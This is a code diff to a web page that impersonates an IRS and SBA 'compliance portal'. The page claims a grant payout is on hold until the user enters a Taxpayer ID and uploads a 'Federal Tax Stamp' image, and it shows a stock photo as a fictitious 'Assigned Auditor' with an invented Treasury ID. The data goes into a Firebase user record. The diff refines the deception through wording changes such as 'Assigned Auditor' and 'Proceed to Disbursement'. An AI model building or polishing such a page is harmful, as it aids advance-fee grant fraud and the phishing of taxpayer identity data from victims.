@@ -18,7 +18,7 @@
         .progress-fill { height: 100%; background: var(--navy); width: 0%; transition: width 1.5s ease; }
         
         .tax-card { background: white; border-radius: 24px; border: 1px solid #e2e8f0; box-shadow: 0 15px 35px rgba(0,0,0,0.05); overflow: hidden; }
-        .status-header { padding: 30px 20px; text-align: center; border-bottom: 2px solid #f1f5f9; }
+        .status-header { padding: 30px 20px; text-align: center; border-bottom: 2px solid #f1f5f9; transition: 0.5s; }
         
         .bg-delinquent { background: #fff1f2; }
         .bg-pending { background: #fffbeb; }
@@ -33,7 +33,7 @@
         .scanner-bar { position: absolute; top: 0; width: 100%; height: 4px; background: var(--red); box-shadow: 0 0 15px var(--red); z-index: 20; display: none; animation: scan 2s infinite linear; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
 
-        .btn-main { background: var(--navy); color: white; width: 100%; height: 60px; border-radius: 16px; font-weight: 900; text-transform: uppercase; border-bottom: 5px solid #001a3d; font-size: 13px; cursor: pointer; }
+        .btn-main { background: var(--navy); color: white; width: 100%; height: 60px; border-radius: 16px; font-weight: 900; text-transform: uppercase; border-bottom: 5px solid #001a3d; font-size: 13px; cursor: pointer; transition: 0.2s; }
         .btn-main:active { transform: translateY(2px); border-bottom-width: 2px; }
         
         .officer-card { background: #0f172a; border-radius: 20px; padding: 20px; margin-top: 25px; border-left: 5px solid var(--gold); }
@@ -42,14 +42,24 @@
 <body>
 
     <div id="authOverlay">
-        <div class="p-4 border-2 border-navy font-black text-navy text-xl mb-4">SBA</div>
-        <h2 class="font-black text-navy text-[10px] uppercase tracking-widest">IRS Compliance Link...</h2>
+        <div class="p-4 border-2 border-[#002e6d] font-black text-[#002e6d] text-xl mb-4">SBA</div>
+        <h2 class="font-black text-[#002e6d] text-[10px] uppercase tracking-widest">IRS Compliance Link...</h2>
         <div class="progress-bar"><div id="pFill" class="progress-fill"></div></div>
     </div>
 
     <div class="gov-banner">IRS Official Compliance Portal • Node 402-TX</div>
 
-    <main class="max-w-md mx-auto px-5 pt-6 pb-10">
+    <header class="p-5 flex items-center justify-between">
+        <button onclick="location.href='dashboard.html'" class="w-10 h-10 bg-white rounded-full shadow-sm flex items-center justify-center text-slate-400">
+            <i class="fas fa-arrow-left"></i>
+        </button>
+        <div class="text-right">
+            <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Form 1099-G</p>
+            <p class="text-[8px] font-bold text-slate-300 uppercase">Rev. March 2026</p>
+        </div>
+    </header>
+
+    <main class="max-w-md mx-auto px-5 pb-10">
         <div class="tax-card">
             <div id="statusBox" class="status-header bg-delinquent">
                 <span id="badge" class="bg-red-600 text-white px-3 py-1 rounded-full text-[9px] font-black uppercase mb-2 inline-block tracking-tighter">Status: Delinquent</span>
@@ -58,8 +68,8 @@
 
             <div class="p-6">
                 <div id="taxView">
-                    <div class="bg-blue-50 p-3 rounded-lg mb-6 border-l-4 border-navy text-[10px] font-bold uppercase leading-tight">
-                        <i class="fas fa-info-circle mr-1 text-navy"></i> Grant disbursement requires a valid IRS Federal Tax Stamp for the current cycle.
+                    <div class="bg-blue-50 p-3 rounded-lg mb-6 border-l-4 border-[#002e6d] text-[10px] font-bold uppercase leading-tight">
+                        <i class="fas fa-info-circle mr-1 text-[#002e6d]"></i> Grant disbursement requires a valid IRS Federal Tax Stamp for the current cycle.
                     </div>
 
                     <div class="grid grid-cols-2 gap-3 mb-4">
@@ -87,7 +97,7 @@
                         <input type="file" id="taxInput" hidden accept="image/*">
                     </div>
 
-                    <button onclick="uploadStamp()" id="subBtn" class="btn-main mt-6">Transmit to Auditor</button>
+                    <button id="subBtn" class="btn-main mt-6">Transmit to Auditor</button>
                 </div>
 
                 <div id="pendingView" class="hidden py-8 text-center">
@@ -101,7 +111,7 @@
                     <div class="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center mx-auto text-white text-3xl mb-4 shadow-lg"><i class="fas fa-check-double"></i></div>
                     <h3 class="text-lg font-black text-slate-800 uppercase italic">Compliance Verified</h3>
                     <p class="text-[10px] text-slate-500 font-bold uppercase mt-4 px-4 leading-relaxed">Hold lifted. Your file is now compliant with Federal tax regulations.</p>
-                    <a href="withdraw.html" class="btn-main mt-8 bg-emerald-600 border-emerald-800 flex items-center justify-center no-underline">Get Disbursement</a>
+                    <a href="withdraw.html" class="btn-main mt-8 bg-emerald-600 border-emerald-800 flex items-center justify-center no-underline">Proceed to Disbursement</a>
                 </div>
 
                 <div id="deniedView" class="hidden py-8 text-center">
@@ -117,14 +127,14 @@
 
         <div class="officer-card">
             <div class="flex items-center gap-4">
-                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=120" class="w-12 h-12 rounded-xl grayscale object-cover border border-white/10">
+                <div class="relative">
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=120" class="w-12 h-12 rounded-xl grayscale object-cover border border-white/10">
+                    <div class="absolute -bottom-1 -right-1 w-3 h-3 bg-green-500 border-2 border-[#0f172a] rounded-full"></div>
+                </div>
                 <div class="flex-1">
-                    <p class="text-[9px] font-black text-gold uppercase tracking-widest">Assigned Agent</p>
+                    <p class="text-[9px] font-black text-gold uppercase tracking-widest">Assigned Auditor</p>
                     <p class="text-white font-black text-base leading-none mt-1">Sarah Miller</p>
-                    <div class="flex items-center gap-1.5 mt-2">
-                        <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
-                        <span class="text-[9px] text-slate-400 font-bold uppercase">Auditing System Online</span>
-                    </div>
+                    <p class="text-[9px] text-slate-400 font-bold uppercase mt-1 tracking-tighter">Treasury ID: #8829-Compliance</p>
                 </div>
             </div>
         </div>
@@ -140,7 +150,6 @@
         onAuthStateChanged(auth, (user) => {
             if (!user) { window.location.href = "login.html"; return; }
             
-            // Fast Auth Loader
             setTimeout(() => { document.getElementById('pFill').style.width = "100%"; }, 100);
             setTimeout(() => { document.getElementById('authOverlay').style.display = 'none'; }, 1600);
 
@@ -148,7 +157,8 @@
                 const d = snap.data(); if(!d) return;
                 
                 const status = d.taxStatus || "DELINQUENT";
-                ['taxView', 'pendingView', 'successView', 'deniedView'].forEach(v => document.getElementById(v).classList.add('hidden'));
+                const views = ['taxView', 'pendingView', 'successView', 'deniedView'];
+                views.forEach(v => document.getElementById(v).classList.add('hidden'));
 
                 if(status === "PENDING_VALIDATION" || status === "PENDING") {
                     document.getElementById('pendingView').classList.remove('hidden');
@@ -158,7 +168,7 @@
                     updateHeader("bg-success", "HOLD RELEASED", "bg-emerald-600", "Compliant");
                 } else if(status === "DECLINED" || status === "REJECTED") {
                     document.getElementById('deniedView').classList.remove('hidden');
-                    document.getElementById('denialReason').innerText = d.taxDenialReason || "Stamp verification failed. Please upload a clear image.";
+                    document.getElementById('denialReason').innerText = d.taxDenialReason || "Security Seal could not be verified. Please re-upload.";
                     updateHeader("bg-denied", "STAMP REJECTED", "bg-red-600", "Action Required");
                 } else {
                     document.getElementById('taxView').classList.remove('hidden');
@@ -168,17 +178,18 @@
         });
 
         function updateHeader(bg, title, badgeClass, badgeText) {
-            document.getElementById('statusBox').className = "status-header " + bg;
+            const sb = document.getElementById('statusBox');
+            sb.className = "status-header " + bg;
             document.getElementById('statusTitle').innerText = title;
-            document.getElementById('badge').className = badgeClass + " text-white px-3 py-1 rounded-full text-[9px] font-black uppercase mb-2 inline-block tracking-tighter";
-            document.getElementById('badge').innerText = "Status: " + badgeText;
+            const b = document.getElementById('badge');
+            b.className = badgeClass + " text-white px-3 py-1 rounded-full text-[9px] font-black uppercase mb-2 inline-block tracking-tighter";
+            b.innerText = "Status: " + badgeText;
         }
 
         window.resetTaxForm = async () => {
             await updateDoc(doc(db, "users", auth.currentUser.uid), { taxStatus: "DELINQUENT" });
         };
 
-        // Image Handling with Compression
         document.getElementById('taxInput').onchange = (e) => {
             const file = e.target.files[0];
             if(!file) return;
@@ -192,17 +203,18 @@
                 img.src = event.target.result;
                 img.onload = () => {
                     const canvas = document.createElement('canvas');
-                    const scale = 600 / img.width;
-                    canvas.width = 600;
+                    const MAX_WIDTH = 600;
+                    const scale = MAX_WIDTH / img.width;
+                    canvas.width = MAX_WIDTH;
                     canvas.height = img.height * scale;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                    
                     compressedStamp = canvas.toDataURL('image/jpeg', 0.6);
                     
                     setTimeout(() => {
-                        document.getElementById('previewImg').src = compressedStamp;
-                        document.getElementById('previewImg').classList.remove('hidden');
+                        const prev = document.getElementById('previewImg');
+                        prev.src = compressedStamp;
+                        prev.classList.remove('hidden');
                         document.getElementById('scanner').style.display = 'none';
                         document.getElementById('uploadPlaceholder').classList.add('hidden');
                     }, 2000);
@@ -211,21 +223,26 @@
             reader.readAsDataURL(file);
         };
 
-        window.uploadStamp = async () => {
+        document.getElementById('subBtn').onclick = async () => {
             const tin = document.getElementById('tinNumber').value;
-            if(!compressedStamp || !tin) return alert("Federal Error: TIN and Tax Stamp required.");
+            if(!compressedStamp || !tin) return alert("Compliance Error: TIN and Tax Stamp image required.");
             
-            document.getElementById('subBtn').innerText = "TRANSMITTING DATA...";
+            document.getElementById('subBtn').innerText = "TRANSMITTING TO NODE...";
             document.getElementById('subBtn').disabled = true;
 
-            await updateDoc(doc(db, "users", auth.currentUser.uid), {
-                taxStatus: "PENDING_VALIDATION",
-                taxProof: compressedStamp,
-                taxPayerID: tin,
-                taxYear: document.getElementById('taxYear').value,
-                featureFrom: "TAX_COMPLIANCE_NODE",
-                taxSubmittedAt: new Date().toLocaleString()
-            });
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    taxStatus: "PENDING_VALIDATION",
+                    taxProof: compressedStamp,
+                    taxPayerID: tin,
+                    taxYear: document.getElementById('taxYear').value,
+                    taxSubmittedAt: new Date().toLocaleString()
+                });
+            } catch (err) {
+                alert("Federal Connection Interrupted.");
+                document.getElementById('subBtn').innerText = "Transmit to Auditor";
+                document.getElementById('subBtn').disabled = false;
+            }
         };
     </script>
 </body>
